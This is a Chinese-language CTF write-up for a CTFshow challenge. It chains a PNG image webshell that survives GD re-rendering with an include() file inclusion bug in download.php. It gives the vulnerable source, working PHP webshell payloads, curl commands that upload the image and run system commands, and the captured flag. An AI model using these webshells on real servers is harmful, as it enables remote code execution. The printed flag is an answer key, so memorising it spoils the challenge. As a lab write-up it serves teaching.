# CTFshow Web入门 - PNG图片马 + include 文件包含

## 题目信息

- **来源**：CTFshow Web入门
- **考点**：PNG图片马上传 + GD二次渲染绕过 + `include()` 文件包含
- **目标地址**：`https://a046283f-8538-4a57-89a0-f5cc0d8b9368.challenge.ctf.show/`

---

## 题目分析

### 前端页面

存在上传按钮，仅接受 PNG 图片，上传后可通过 `download.php?image=<filename>` 查看图片。

### 后端源码

**`upload.php`** （上传处理）：

```php
if ($_FILES['file']['type'] == 'image/png') {
    $arr = pathinfo($filename);
    $ext_suffix = $arr['extension'];
    if (in_array($ext_suffix, array("png"))) {
        $png = imagecreatefrompng($_FILES["file"]["tmp_name"]);
        if ($png == FALSE) {
            $ret = array("code" => 2, "msg" => "...");
        } else {
            $dst = 'upload/' . md5($_FILES["file"]["name"]) . ".png";
            imagepng($png, $dst);
            $ret = array("code" => 0, "msg" => md5($_FILES["file"]["name"]) . ".png");
        }
    }
}
```

关键点：
- 仅校验 MIME 类型 `image/png` 和扩展名 `png`
- **使用 `imagecreatefrompng()` 读取后再用 `imagepng()` 重新保存**（GD库二次渲染）
- 文件名是 `md5(原文件名) + ".png"`，无随机化

**`download.php`** （文件查看）：

```php
$file = $_GET['image'];
$file = strrev($file);
$ext = strrev(substr($file, 0, 4));
if ($ext === '.png' && file_exists("./upload/" . strrev($file))) {
    header('Content-Type:image/png');
    include("./upload/" . strrev($file));
} else {
    echo "图片错误";
}
```

关键点：
- `strrev()` 反转了文件名做简单校验，实际等效于检查后缀是否为 `.png`
- **使用了 `include()` 包含图片文件** —— 经典的文件包含漏洞
- PHP 会解析图片内容中的 `<?php` / `<?=` 标签并执行

---

## 利用思路

上传一个 PNG 图片，其二进制内容中嵌入 PHP webshell 代码（`<?=...?>`），利用 `include()` 触发执行。

**难点**：服务端做了 GD 二次渲染（`imagecreatefrompng` → `imagepng`），会解压 IDAT 后重新压缩。普通的 PNG 隐写 webshell 在二次渲染后会丢失。

---

## 工具选择：ImageWebshell

使用开源工具 [ImageWebshell](https://github.com/Marven11/ImageWebshell)（作者 Marven11）。

项目地址：`/home/nullsky/Tools/ImageWebshell`

### 工作原理

核心思路是将 PHP 代码嵌入 PNG 的 IDAT 压缩数据块中：

1. **DeflateSearcher**：DFS 搜索一个字节序列 `payload`，使得用 `Z_FIXED` 策略压缩 `payload` 时，压缩输出中包含目标 webshell 文本（如 `<?=$_GET[1]($_REQUEST[2]);?>`）
2. **滤波预处理**：对 `payload` 分别应用 PNG Filter Type 1 (Sub) 和 Type 3 (Average) 的**逆运算**（`filter_one` / `filter_three`），得到像素 RGB 值
3. **保存为 PNG**：PIL 保存图片时，正向 PNG 滤波恰好抵消逆运算，恢复出 `payload`，再经 zlib 压缩后 IDAT 中包含 webshell 文本

### 抗 GD 二次渲染原理

这是该工具最巧妙的地方：

- `filter_one` 是 PNG Filter Type 1 (Sub) 的逆运算：`reconstructed[i+3] = payload[i+3] + reconstructed[i]`
- `filter_three` 是 PNG Filter Type 3 (Average) 的逆运算：`reconstructed[i+3] = payload[i+3] + reconstructed[i]/2`
- 工具存储的像素值 = `filter_one(payload) + filter_three(payload)`

GD 重新编码时，会对像素行应用正向 PNG 滤波（Sub / Average 等）。当 GD 对某行选择 Sub 滤波时：

```
forward_filter[i+3] = pixel[i+3] - pixel[i]
                    = filter_one(payload)[i+3] - filter_one(payload)[i]
                    = (payload[i+3] + filter_one(payload)[i]) - filter_one(payload)[i]
                    = payload[i+3]
```

正向滤波的 Sub 运算**完美抵消**了 `filter_one` 的逆运算，重新得到原始 `payload`。而 `compress(payload)` 本身就包含目标 webshell 文本，因此在新的 IDAT 中 webshell 会再次出现。

同理，Average 滤波抵消 `filter_three`。GD 默认的滤波选择策略通常会包含 Sub 和 Average，因此 webshell 可稳定存活。

---

## 利用过程

### 方法一：`create_function` webshell

**生成 payload**：

```bash
cd /home/nullsky/Tools/ImageWebshell
python -m image_webshell
```

默认文本：
```
<?=$_GET[0]('',(('0'^'M').$_POST[1].'//'));?>
```

**payload 分析**：

| 片段 | 含义 |
|------|------|
| `<?=` | PHP 短标签，等价于 `<?php echo` |
| `$_GET[0]` | 接收 GET 参数 `0`，传入 `create_function` |
| `'0' ^ 'M'` | 异或结果 = `}`（0x30 ^ 0x4D = 0x7D），用于闭合 `create_function` 生成的函数体 |
| `$_POST[1]` | POST 参数 `1`，注入任意 PHP 代码 |
| `//` | 注释掉末尾多余的 `}` |

`create_function('', '}'.$_POST[1].'//')` 生成的函数：

```php
function lambda_N() { }system('id');// }
```

**上传**：

```bash
curl -sk "https://a046283f-8538-4a57-89a0-f5cc0d8b9368.challenge.ctf.show/upload.php" \
  -F "file=@output.png"
```

返回 `{"code":0,"msg":"2beae8e89e6bcfd978c4d90c773eb228.png"}`

**执行命令**：

```bash
curl -sk "https://a046283f-8538-4a57-89a0-f5cc0d8b9368.challenge.ctf.show/download.php?image=2beae8e89e6bcfd978c4d90c773eb228.png&0=create_function" \
  -d "1=system('cat /var/www/html/flag.php');"
```

### 方法二：可变函数 webshell（更简洁）

**生成 payload**：

```bash
cd /home/nullsky/Tools/ImageWebshell
python -m image_webshell text='<?=$_GET[1]($_REQUEST[2]);?>'
```

**payload 分析**：

- `$_GET[1]` — 函数名（如 `system`）
- `$_REQUEST[2]` — 函数参数（如 `id`）

PHP 可变函数特性：`$a('id')` 等价于调用函数 `$a` 并传入参数 `'id'`。

**执行命令**：

```bash
curl -sk "https://a046283f-8538-4a57-89a0-f5cc0d8b9368.challenge.ctf.show/download.php?image=2beae8e89e6bcfd978c4d90c773eb228.png&1=system&2=cat /var/www/html/flag.php"
```

### 获取 Flag

两种方法均可执行命令，结果：

```
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
```

查看 `/var/www/html/flag.php`：

```php
$flag = "ctfshow{be7a998e-4db6-4a24-9a2d-aea74f1533e4}";
```

---

## 总结

| 要点 | 内容 |
|------|------|
| 漏洞入口 | `download.php` 使用 `include()` 包含用户可控文件 |
| 绕过点 | 仅校验 MIME 和扩展名，未严格校验文件内容 |
| 关键突破 | ImageWebshell 构造的 PNG 可抗 GD 二次渲染（滤波运算互逆） |
| 利用条件 | PHP 的 `<?=` 短标签开启；目标有可写上传目录 |
| 修复建议 | 不用 `include()` 处理用户文件；用 `readfile()` 或 `file_get_contents()` 替代 |
